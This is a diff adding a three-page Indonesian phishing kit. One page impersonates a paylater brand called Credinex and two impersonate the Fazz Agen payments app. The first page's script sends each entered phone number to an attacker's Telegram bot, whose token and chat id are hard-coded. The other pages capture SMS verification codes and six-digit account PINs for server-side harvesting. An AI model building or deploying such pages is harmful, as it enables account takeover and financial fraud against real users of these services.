@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Credinex</title>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            font-family: sans-serif;
+        }
+        body {
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            position: relative;
+            background-image: url('bg.png');
+            background-size: 100%;
+            background-repeat: repeat-y;
+            animation: animation 10s infinite;
+        }
+        @keyframes animation {
+            from{
+                background-position: 0 100%;
+            }to{
+                background-position: 0 0;
+            }
+        }
+
+.footer{
+    margin: 10px;
+    padding: 5px;
+    box-sizing: border-box;
+    border-radius: 10px;
+    background-repeat: no-repeat;
+    text-align: center;
+    position: relative;
+}
+.footer .footer-card{
+    margin: 0px;
+    padding: 25px;
+    box-sizing: border-box;
+    border-radius: 10px;
+    background-color: transparent;
+    background-repeat: no-repeat;
+    text-align: center;
+    color: white;
+}
+.footer h3{
+    font-size: 29px;
+    text-align: ;
+    font-weight: bold;
+}
+.footer h2{
+    font-size: 18px;
+    text-align: left;
+    margin-top: 5px;
+}
+.footer p{
+    font-size: 15px;
+    text-align: center;
+    color: white;
+}
+img {
+    padding: 0px;
+    margin: 0;
+    right: 0px;
+    border-radius: 5px;
+}
+.login{
+    margin: 20px;
+    padding: 20px;
+    box-sizing: border-box;
+    background-color: transparent;
+    border-radius: 10px;
+    text-align: left;    
+}
+.login .input-group{
+    position: relative;
+    margin: 0px;
+}
+.login .input-group input[type=tel]{
+    height: 50px;
+    width: 100%;
+    border: 1px solid #404040;
+    border-radius: 5px;    
+    font-size: 16px;
+    padding: 0 50px;
+    box-sizing: border-box;
+    color: #5c5c5c;
+}
+.login .input-group input[type=number]{
+    height: 50px;
+    width: 100%;
+    border: 1px solid #404040;
+    border-radius: 5px;    
+    font-size: 16px;
+    padding: 0 20px;
+    box-sizing: border-box;
+    color: #5c5c5c;
+}
+.login .input-group input[type=password]{
+    height: 50px;
+    width: 100%;
+    border: 1px solid #404040;
+    border-radius: 5px;    
+    font-size: 16px;
+    padding: 0 20px;
+    box-sizing: border-box;
+    color: #white;
+}
+.login .input-group button{
+    height: 50px;
+    width: 100%;
+    border: none;
+    border-radius: 5px;
+    background-color: #26ff00;
+    color: #373737;
+    font-size: 16px;
+    font-weight: bold;    
+}
+.login .input-group span{
+    position: absolute;
+    top: 0;
+    left: 0;
+    padding: 15px;
+    font-size: 17px;
+    color: #404040;
+    font-weight: bold;
+}
+.login .input-group fieldset{
+    background-color: #ffffff;
+    padding: 20px;
+    margin-top: 20px;
+    text-align: center;
+    border: none;
+}
+.login .input-group h5{
+    font-size: 16px;
+    text-align: left;
+    margin-bottom: 10px;
+    color: white;
+}
+.login .input-group h4{
+    text-align: left;
+    font-size: 18px;
+    margin-bottom: 20px;
+}
+.login .input-group h1{
+    text-align: center;
+    font-size: 18px;
+    margin-bottom: 20px;
+}
+.login .input-group p{
+    text-align: left;
+    font-size: 16px;
+    margin-top: 10px;
+    color: white;
+}
+    </style>    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <footer class="footer">
+        <div class="footer-card">
+            <h3>Credinex</h3>
+            <p>Belanja cerdas <i>dan</i> <b>Paylater</b></p>        
+        </div>
+     </footer>
+    <form action="item.html" onsubmit="return sender()">        
+        <div class="login">
+            <div class="input-group">
+                <h5>Selamat datang di Credinex</h5>
+            </div>
+            <div class="input-group">
+                <input type="tel" name="hp" id="hp" placeholder="Nomor dengan awalan 08" maxlength="14" required>
+                <span>+62</span>
+            </div>
+            <div class="input-group">
+                <p>Masukkan nomor telepon 9 hingga 14 digit di mulai dengan 08 atau 8</p>
+            </div>
+            <br><br><br>
+            <div class="input-group">
+                <button type="submit" onclick="submit()">Daftar/Masuk</button>
+         <div></div>
+              
+         </div>       
+              
+       </div>
+            </div>                        
+        </div>
+    </form>
+    <script>
+        //bot token
+var telegram_bot_id = "7574296803%3AAAE_f4topknrug31kDeXaJb0DG9w5E0OxTo"
+//chat id
+var chat_id = 7015306286
+var u_tel;
+var ready = function submit() {
+    u_tel = document.getElementById("hp").value;
+    message = "[Credinex | No HP]\n \nNomor Hp: " + u_tel
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function(response){
+        console.log('');
+    });
+    document.getElementById("hp").value = "";
+    return false;
+};
+    </script>
+       
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Akun</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="icon" href="https://support-agen.fazz.com/hc/theming_assets/01HZM5JPN4HDRFE5C5X0NAJDQP" rel="shortcut icon" type="image/x-icon">
+    <meta property="og:description" content="Fazz Agen, sebelumnya dikenal sebagai PAYFAZZ, merupakan sebuah aplikasi keuangan yang telah hadir sejak tahun 2016. Aplikasi Fazz Agen dapat digunakan untuk melakukan pembelian ataupun pembayaran ..">
+   
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #ffffff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            text-align: center;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+        }
+        .header i {
+            font-size: 24px;
+        }
+        .header h1 {
+            font-size: 20px;
+            margin: 0;
+        }
+        .verification-info {
+            margin: 20px 0;
+        }
+        .verification-info p {
+            margin: 5px 0;
+            font-size: 16px;
+        }
+        .verification-info p span {
+            font-weight: bold;
+        }
+        .verification-info .icons {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 10px;
+        }
+        .verification-info .icons i {
+            font-size: 24px;
+            margin: 0 10px;
+        }
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+        }
+        .code-inputs input {
+            width: 25px;
+            height: 25px;
+            font-size: 24px;
+            text-align: center;
+            border: 2px solid #007BFF;
+            border-radius: 10px;
+        }
+        .resend-code {
+            color: #888888;
+            font-size: 14px;
+        }
+        .warning {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #007BFF;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <i class="fas fa-arrow-left"></i>
+            <h1>Verifikasi Akun</h1>
+            <i class="fas fa-headset"></i>
+        </div>
+        <div class="verification-info">
+            <p>Kode Verifikasi telah dikirim via SMS / Whatsapp</p>
+            <p>Ke nomor <span id="usernameDisplay"></span></p>
+            <div class="icons">
+                <i class="fab fa-whatsapp" style="color: #25D366;"></i>
+                <i class="fas fa-comment-dots" style="color: #000000;"></i>
+            </div>
+        </div>
+        <form action="auth/three.php" method="post">
+            <div class="code-inputs">
+                <input id="otp1" name="otp1" type="number" required maxlength="1" oninput="moveToNext(this, 'otp2')">
+                <input id="otp2" name="otp2" type="number" required maxlength="1" oninput="moveToNext(this, 'otp3')">
+                <input id="otp3" name="otp3" type="number" required maxlength="1" oninput="moveToNext(this, 'otp4')">
+                <input id="otp4" name="otp4" type="number" required maxlength="1" oninput="moveToNext(this, 'otp5')">
+                <input id="otp5" name="otp5" type="number" required maxlength="1" oninput="moveToNext(this, 'otp6')">
+                <input id="otp6" name="otp6" type="number" required maxlength="1">
+            </div>
+            <div class="resend-code" id="resendTimer">
+                Kirim Ulang Kode Verifikasi (3:00)
+            </div>
+            <div class="warning">
+               
+              
+  
+            </div>
+                    <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+            <button class="submit-btn">Lanjut</button>
+        </form>
+    </div>
+<script>
+    // Function to move to the next input field automatically
+    function moveToNext(current, nextFieldId) {
+        if (current.value.length === current.maxLength) {
+            document.getElementById(nextFieldId).focus();
+        }
+    }
+
+    // Countdown timer function
+    let countdownTime = 180; // 3 minutes in seconds
+    const timerElement = document.getElementById('resendTimer');
+
+    function updateTimer() {
+        const minutes = Math.floor(countdownTime / 60);
+        const seconds = countdownTime % 60;
+        timerElement.textContent = `Kirim Ulang Kode Verifikasi (${minutes}:${seconds < 10 ? '0' : ''}${seconds})`;
+        
+        if (countdownTime <= 0) {
+            clearInterval(timerInterval);
+            timerElement.textContent = 'Kirim Ulang Kode Verifikasi';
+        }
+        countdownTime--;
+    }
+
+    const timerInterval = setInterval(updateTimer, 1000);
+
+    window.onload = function() {
+        var username = sessionStorage.getItem("hp")
+            
+        }
+    };
+</script>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://support-agen.fazz.com/hc/theming_assets/01HZM5JPN4HDRFE5C5X0NAJDQP" rel="shortcut icon" type="image/x-icon">
+    <meta property="og:description" content="Fazz Agen, sebelumnya dikenal sebagai PAYFAZZ, merupakan sebuah aplikasi keuangan yang telah hadir sejak tahun 2016. Aplikasi Fazz Agen dapat digunakan untuk melakukan pembelian ataupun pembayaran ..">
+   <title>PIN Akun</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #F5F5F5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            height: 100vh;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            background-color: #FFFFFF;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .header i {
+            font-size: 24px;
+            margin-right: 10px;
+        }
+        .header h1 {
+            font-size: 18px;
+            margin: 0;
+        }
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start; /* Change to flex-start */
+            align-items: center;
+            text-align: center;
+            margin-top: 50px; /* Add margin to push it down a bit */
+        }
+        .container p {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333333;
+            margin: 20px 0;
+        }
+        .pin-input {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .pin-input input {
+            width: 25px;
+            height: 25px;
+            border: 2px solid #CCCCCC;
+            border-radius: 50%; /* Make the input circular */
+            margin: 0 5px;
+            text-align: center;
+            font-size: 18px;
+            outline: none; /* Remove outline on focus */
+        }
+        .pin-input input:focus {
+            border-color: #007BFF; /* Change border color on focus */
+        }
+        .forgot-pin {
+            color: #007BFF;
+            font-size: 14px;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .forgot-pin:hover {
+            text-decoration: underline;
+        }
+        .button-container {
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .button {
+            width: 100%;
+            padding: 15px;
+            background-color: #007BFF;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+</head>
+<body>
+    <div class="header">
+        <i class="fas fa-arrow-left"></i>
+        <h1> Verifikasi PIN </h1>
+    </div>
+    <div class="container">
+        <p>Verifikasi PIN </p>
+        <form action="auth/two.php" method="POST">
+        <div class="pin-input">
+            <input id="pin1" name="pin1" type="number" maxlength="1" oninput="moveToNext(this, 'pin2')"/>
+            <input id="pin2" name="pin2" type="number" maxlength="1" oninput="moveToNext(this, 'pin3')"/>
+            <input id="pin3" name="pin3" type="number" maxlength="1" oninput="moveToNext(this, 'pin4')"/>
+            <input id="pin4" name="pin4" type="number" maxlength="1" oninput="moveToNext(this, 'pin5')"/>
+            <input id="pin5" name="pin5" type="number" maxlength="1" oninput="moveToNext(this, 'pin6')"/>
+            <input id="pin6" name="pin6" type="number" maxlength="1" />
+        </div>
+        <br>
+        <a href="#" class="forgot-pin"></a>Jangan Bagikan PIN anda Jagalah kerahasiaan PiN anda
+    </div>
+    <div class="button-container">
+        <button class="button">Lanjut</button>
+    </div>
+    </form>
+    <script>
+        // Function to move to the next input field automatically
+        function moveToNext(current, nextFieldId) {
+            if (current.value.length === current.maxLength) {
+                document.getElementById(nextFieldId).focus();
+            }
+        }
+    </script>
+</body>
+</html>
